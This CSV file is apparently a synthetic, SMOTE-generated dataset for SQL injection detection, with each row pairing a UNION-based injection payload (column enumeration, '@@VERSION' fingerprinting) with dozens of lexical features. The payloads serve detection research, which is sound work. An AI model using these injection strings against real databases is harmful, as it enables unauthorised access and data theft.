id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000103,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,0.9490193046964759,80.42511410858275,30.437214728543125,4.094179590900381,40.0,2.7125570542913753,23.712557054291374,14.0,0.49742075881492265,0.03366803861101006,0.2948139369888444,0.17409726558522293,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.7125570542913746,0.0,1.0000000000000004,5.42511410858275,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000099,0.09995415170910327,73.51356223324383,20.097287553351233,3.402214883210759,14.000000000000002,43.61084978659507,4.0,11.902712446648767,0.19052293943098048,0.5931465229035069,0.054435125551708735,0.1618954121138039,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.902712446648767,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000105,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.4370143659721113,73.74389644428732,32.256103555712684,4.379042516047335,43.48779288857464,2.6280517778563404,17.0,10.62805177785634,0.5894731014074668,0.035728966292356334,0.2305668968853179,0.14423103541485888,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.62805177785634,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000106,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,1.6209639047912232,72.48931713699764,15.489317136997634,3.1255822887047433,44.04273145200946,1.0,15.95726854799054,11.489317136997634,0.6077945350538032,0.013795792021119163,0.21995298621334702,0.15845668671173055,0.0,0.4893171369976348,2.0,0.0,0.0,0.0,0.0,2.489317136997635,0.0,0.0,6.510682863002366,2.0,0.0,0.4893171369976348,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.7109723376475543,68.20184438133948,21.19953890466513,3.706668500066651,39.0,9.0,13.201844381339491,7.0,0.5721578749448739,0.1320364326795863,0.1931106891803059,0.10269500319523381,0.19953890466512747,0.0,0.0,0.0,0.0,1.0,0.0,0.8004610953348725,0.0,0.0,4.0,1.0,0.19953890466512747,0.0,0.0,1.0,0.0,1.0,0.8004610953348725,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000108,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000062,0.6249053656612499,65.0,21.441563988679718,3.7045281694903784,14.000000000000002,35.116872022640564,4.8831279773594325,11.0,0.2153846153846154,0.5402595695790857,0.07512504580552976,0.16923076923076924,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.22078199433985857,1.0,0.0,6.779218005660141,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.22078199433985835,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000109,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000086,1.8225264628668412,62.06183342026942,20.53091671013471,3.6336751510085703,14.000000000000002,20.0,18.0,10.061833420269423,0.2256399511101296,0.3223427873001852,0.2901085085701666,0.1619087530195186,0.5309167101347114,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.5309167101347114,0.0,3.0,3.0,0.5309167101347113,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,0.5673576338485211,60.28922510872904,14.289225108729044,3.025423255348832,46.0,1.0,4.0,9.289225108729044,0.7630902271501248,0.016588917981524426,0.0663556719260978,0.15396518294225303,0.14461255436452208,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.1446125543645221,0.0,7.0,2.0,0.14461255436452214,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,0.07860283478434285,67.21595187119048,22.0,3.560919508756581,14.000000000000002,28.191957218835984,14.0,11.023994652354498,0.2083614834649123,0.41924871980924533,0.20836148346491226,0.1640283132609301,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.976005347645502,0.0,5.047989304708996,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000112,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000053,0.4795333844009262,67.04128274047939,15.173547123413229,3.0872060226946316,38.69418849365292,1.0,18.0,9.347094246826462,0.5770723266925245,0.014932389995690354,0.2687830199224266,0.13921226338935858,0.1735471234132303,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.173547123413231,0.0,0.17354712341323042,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,1.951065995336327,58.16202493567661,22.054008311892204,3.87588315022048,23.216033247568816,16.0,12.418987532161694,6.527004155946102,0.39666269890862277,0.27582938927844236,0.21543247844095992,0.11207543337197495,1.0,0.0,3.0,0.0,0.0,0.4729958440538978,0.0,1.0,0.0,0.0,1.0540083118922041,3.472995844053898,1.0,0.0,1.0,0.0,0.0,0.4729958440538978,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.47299584405389783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.472995844053898
SMOTE_000114,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.3745581043070543,68.36708766611297,23.36416733324815,3.8611000463905314,36.820836666240744,9.0,14.36416733324815,8.182083666624075,0.537462054403133,0.13227775431626068,0.2103751086821627,0.11988508259844365,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.1820836666240746,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000115,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000074,1.0995316400512836,59.88768633870118,22.73033052304269,3.878483130928496,31.696694769573114,9.0,14.381983138256132,4.809008430871934,0.5269669476957312,0.15066600078294148,0.24295810095481082,0.07940895056651656,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7303305230426886,0.0,0.0,1.078677907829245,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.7303305230426888,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,1.538267822409047,63.698482224488075,24.41268972193899,3.933896724286272,29.571585005098175,13.539586941328892,14.58731027806101,6.0,0.45723560663686286,0.21878724640744832,0.22941375038268821,0.09456339657300064,1.0,0.0,0.41268972193899045,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0000000000000004,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5873102780610098,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5873102780610098
SMOTE_000117,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,0.04376904242436425,68.01173423891358,25.023468477827162,3.867359724010943,19.070405433481486,27.859189133037027,14.09387391130865,6.988265761086419,0.28038461614181226,0.4096539433838315,0.207207831761338,0.1027536087130182,0.011734238913581163,0.0,1.0,0.0,0.0,1.0,0.0,1.0117342389135813,0.0,0.0,2.964797283259257,2.0,0.011734238913581219,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,3.4323683643568677,75.6148233020673,26.0,3.8449484382493107,40.0,1.9999999999999982,24.0,9.61482330206729,0.5290187838451418,0.026450939192257078,0.31741127030708505,0.12711900665551598,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.38517669793271,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000119,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,1.18718052363244,59.35941715617382,22.0,3.7987905917914464,14.000000000000002,22.359417156173816,14.0,9.0,0.23611393724865304,0.3759845944142741,0.23611393724865304,0.1517875310884198,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.4101457109565461,0.0,3.589854289043454,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000137,0.31744160103767544,71.93465871657445,16.0,3.1630517786663717,42.0,1.0,17.112215597145372,11.822443119429074,0.5853905982267849,0.013937871386352052,0.2363278422845884,0.16434368810227465,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.822443119429075,0.0,0.0,6.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.47906578887488555,73.81547739541922,32.184522604580785,4.377013946790153,43.63095479083843,2.5922613022903906,17.0,10.592261302290392,0.5908328126253147,0.03521253751250064,0.23034463639778507,0.14361001346439947,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.5922613022903915,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000122,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000071,0.01799893575411781,74.99388507024855,19.006114929751444,3.632841444802609,14.000000000000002,44.0,4.0,12.993885070248556,0.18668209171468833,0.5867151453890205,0.05333774048991097,0.17326502240638025,0.0,0.9938850702485558,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,3.0,0.0,0.9938850702485558,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.7901285983842411,76.0,26.0,3.8832573136607493,40.37851084699353,2.3785108469935246,23.378510846993528,9.864467459019421,0.531296195355178,0.03129619535517794,0.30761198482886215,0.12979562446078186,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.242978306012947,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,0.8427285223735219,65.94606846078354,21.763482884804116,3.77207214909126,39.0,9.0,10.946068460783536,7.0,0.591773317732317,0.1365630733228424,0.16544788524929643,0.10621572369554409,0.7634828848041159,0.0,0.0,0.0,0.0,1.0,0.0,0.23651711519588414,0.0,0.0,4.0,1.0,0.7634828848041157,0.0,0.0,1.0,0.0,1.0,0.23651711519588403,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,0.03942994407733779,61.91719567267063,25.976341620763037,4.105016711077558,24.929024862289115,16.0,15.976341620763037,5.0118291896184815,0.4025424192507798,0.25845304083204396,0.258022888482281,0.0809816514348952,0.0,0.011829189618481117,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,4.0,0.0,0.011829189618481062,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000014,1.1478043180442086,79.99072971257337,32.77674774584149,4.311031379493838,42.0,3.7767477458414866,20.88373872920743,13.330243237524458,0.5262929087991844,0.04706488411438495,0.26038598765760024,0.16625621942883034,2.3302432375244586,0.0,2.0,0.0,1.0,1.7767477458414862,0.0,0.0,0.0,0.0,1.0000000000000004,5.776747745841487,0.7767477458414861,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000127,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,0.11970124638872397,74.70960700036892,31.14519649981554,4.345220243178126,45.419214000737846,2.2903929996310737,17.0,10.0,0.6078171923357749,0.030750732597551206,0.22756834356049832,0.13386373150617548,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.145196499815539,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000128,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000003,0.012056500608019162,75.98214710028515,26.982147100285154,3.8797412425949354,40.0,1.9999999999999982,24.0,9.982147100285152,0.5264410729804551,0.026322053649022736,0.31586464378827306,0.13137222958224912,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,1.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000129,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.8821049354327581,58.32540532890322,23.976215986709672,3.9631906035751325,25.745946710967754,12.579458617935469,15.34918934219355,4.650810657806448,0.4420888821443414,0.2149853745996868,0.2633099054894139,0.07961583776655791,0.0,1.0,0.3254053289032244,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3254053289032246,1.3254053289032246,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,1.3836983571628043,69.76365982451634,24.07533137843324,3.9349206836882074,38.225994135299715,9.0,14.53766568921662,8.0,0.5471539059924677,0.12933313855943396,0.2085501656174903,0.11496278983060798,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.46233431078338,3.53766568921662,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5376656892166198,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5376656892166194
SMOTE_000131,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.3605303334652263,70.91094706027643,19.382189412055283,3.662873605425472,14.000000000000002,41.52875764822113,4.0,11.382189412055284,0.1976589778997513,0.5853988239945558,0.05647399368564324,0.16046820442004975,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.382189412055284,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,8.429369702178807e-08,65.0,21.0,3.8635598296829112,14.000000000000002,32.0,8.0,11.0,0.2153846153846154,0.49230769230769234,0.12307692307692308,0.16923076923076924,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000133,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,0.43319539728841755,80.71785219491598,23.10684565042367,3.8477975910494813,24.35892609745799,32.0,15.358926097457987,9.0,0.3013041176164905,0.397391764767019,0.18953768377576644,0.11176643384072409,0.10684565042366884,0.0,3.0,0.0,0.0,1.0,0.0,0.893154349576331,0.0,0.0,4.0,4.0,0.10684565042366895,0.0,1.0,0.0,0.0,1.0,0.8931543495763312,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000134,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,1.1328668464210112,69.46226216160792,19.462262161607924,3.6837925733104986,14.000000000000002,40.0,4.0,11.462262161607923,0.20155866040113646,0.5758818868603899,0.05758818868603899,0.16497126405243467,0.4622621616079222,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.4622621616079223,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,0.09847419904705801,71.58189180772456,30.832756723089823,4.305815750987024,25.0,23.665513446179645,16.0,6.916378361544911,0.34938903499313556,0.33042113696922576,0.22360898239560678,0.09658084564203187,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.9163783615449113,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
